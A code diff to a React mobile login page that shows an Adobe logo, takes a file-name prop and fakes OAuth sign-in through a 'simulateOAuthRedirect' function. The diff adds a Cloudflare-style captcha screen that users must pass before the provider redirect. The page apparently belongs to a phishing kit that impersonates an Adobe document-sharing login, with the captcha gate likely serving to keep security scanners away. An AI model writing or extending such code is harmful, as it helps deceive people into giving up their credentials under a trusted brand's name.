@@ -2,6 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../../hooks/useLogin';
 import Spinner from '../../components/common/Spinner';
+import CloudflareCaptcha from '../CloudflareCaptcha';
 
 interface LoginPageProps {
   fileName: string;
@@ -30,6 +31,10 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   const [isRedirecting, setIsRedirecting] = useState(false);
   const [isProcessingReturn, setIsProcessingReturn] = useState(false);
   
+  // New state for captcha handling
+  const [showCaptcha, setShowCaptcha] = useState(false);
+  const [pendingProvider, setPendingProvider] = useState<string | null>(null);
+
   const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
     onLoginSuccess,
     onLoginError
@@ -135,7 +140,15 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   };
 
   const handleProviderClick = (providerName: string) => {
-    simulateOAuthRedirect(providerName);
+    setPendingProvider(providerName);
+    setShowCaptcha(true);
+  };
+
+  const handleCaptchaVerified = () => {
+    setShowCaptcha(false);
+    if (pendingProvider) {
+      simulateOAuthRedirect(pendingProvider);
+    }
   };
 
   const AdobeLogo = () => (
@@ -145,6 +158,11 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       className="w-9 h-9 drop-shadow-lg"
     />
   );
+
+  // Show captcha screen
+  if (showCaptcha) {
+    return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
+  }
 
   // Show redirecting screen for mobile
   if (isRedirecting || isProcessingReturn) {
